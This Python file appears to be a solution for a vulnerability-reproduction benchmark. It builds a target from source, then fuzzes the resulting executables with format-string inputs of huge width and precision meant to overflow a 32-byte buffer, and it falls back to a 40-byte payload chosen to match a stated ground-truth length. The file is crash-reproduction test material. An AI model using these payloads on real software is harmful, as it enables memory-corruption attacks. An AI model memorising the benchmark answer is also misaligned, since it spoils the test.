import sys
import os
import tarfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create working directory
        work_dir = os.path.abspath("/tmp/arvo_work")
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        os.makedirs(work_dir)
        
        # Extract source
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
        except Exception:
            pass
            
        # Locate source root
        src_root = work_dir
        items = os.listdir(work_dir)
        if len(items) == 1 and os.path.isdir(os.path.join(work_dir, items[0])):
            src_root = os.path.join(work_dir, items[0])
            
        # Attempt to build
        # We try to build to get a binary to test, but if it fails we fall back to the heuristic payload.
        built = False
        try:
            if os.path.exists(os.path.join(src_root, "configure")):
                subprocess.run(["./configure"], cwd=src_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
            subprocess.run(["make", "-j8"], cwd=src_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
            built = True
        except Exception:
            pass

        # Find executables
        executables = []
        for root, dirs, files in os.walk(src_root):
            for f in files:
                path = os.path.join(root, f)
                if os.access(path, os.X_OK) and not f.endswith(('.sh', '.py', '.c', '.h', '.o', '.a', '.la')):
                     executables.append(path)

        # Construct candidate payloads
        # Vulnerability: Integer format string exceeding 32 chars buffer.
        # Requires Width and Precision to be large.
        # Ground truth length: 40 bytes.
        
        # Candidate 1: Raw format string fitting exactly 40 bytes
        # % + 18 digits (width) + . + 19 digits (prec) + d
        # 1 + 18 + 1 + 19 + 1 = 40 bytes
        w18 = "9" * 18
        p19 = "9" * 19
        payload_raw_40 = f"%{w18}.{p19}d".encode()
        
        # Candidate 2: Slightly larger to ensure overflow
        w19 = "9" * 19
        payload_raw_41 = f"%{w19}.{p19}d".encode()
        
        # Candidate 3: PHP context if detected
        # <?php sprintf("%1...d",1); (approx 40 bytes)
        # <?php sprintf("%9999999999999999999d",1); -> 40 bytes exactly
        # 6 + 9 + 19 + 1 + 2 + 1 + 2 = 40 (if simplified)
        # <?php sprintf("%1111111111111111111d",1);
        # 6 (tag) + 9 (sprintf(") + 19 (width) + 1 (d) + 2 (",) + 1 (1) + 2 ( );) = 40 bytes
        payload_php = b'<?php sprintf("%1111111111111111111d",1);'

        payloads = [payload_raw_40, payload_raw_41, payload_php]

        # Fuzz binaries
        for exe in executables:
            for p in payloads:
                # Try stdin
                try:
                    proc = subprocess.Popen([exe], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    _, stderr = proc.communicate(input=p, timeout=1)
                    if proc.returncode != 0:
                        # Check for crash signals (SIGSEGV=139, SIGABRT=134) or sanitizer output
                        if proc.returncode in [139, -11, 134, -6] or b"Sanitizer" in stderr:
                            return p
                except Exception:
                    pass
                
                # Try argv (skip for PHP payload)
                if b"<?php" not in p:
                    try:
                        proc = subprocess.Popen([exe, p.decode()], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                        _, stderr = proc.communicate(timeout=1)
                        if proc.returncode != 0:
                            if proc.returncode in [139, -11, 134, -6] or b"Sanitizer" in stderr:
                                return p
                    except Exception:
                        pass

        # If we couldn't verify a crash, heuristics based on ground truth length and description.
        # The description matches a known format string overflow where width/prec cause overflow.
        # If it's PHP, the payload is the script. If it's a CLI tool, it's the raw string.
        # Given "Ground-truth PoC length: 40 bytes", the raw format string payload_raw_40 matches exactly 40 bytes
        # and satisfies the overflow condition (>32 chars).
        
        return payload_raw_40